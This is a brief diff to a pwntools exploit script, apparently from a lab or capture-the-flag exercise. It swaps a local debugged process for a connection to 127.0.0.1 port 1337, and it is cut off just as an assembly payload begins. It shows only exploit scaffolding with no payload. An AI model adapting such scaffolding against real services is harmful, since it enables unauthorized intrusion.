@@ -5,11 +5,9 @@ from pwn import *
 
 context.arch = 'amd64'
 
-p = process('./vulnerable_program_static', aslr=False, env={})
+#p = process('./vulnerable_program_static', aslr=False, env={})
 
-g = gdb.attach(p, gdbscript="""
-    break *vuln+37  
-    """)
+p = remote('127.0.0.1', 1337)
 
 
 payload = asm("""
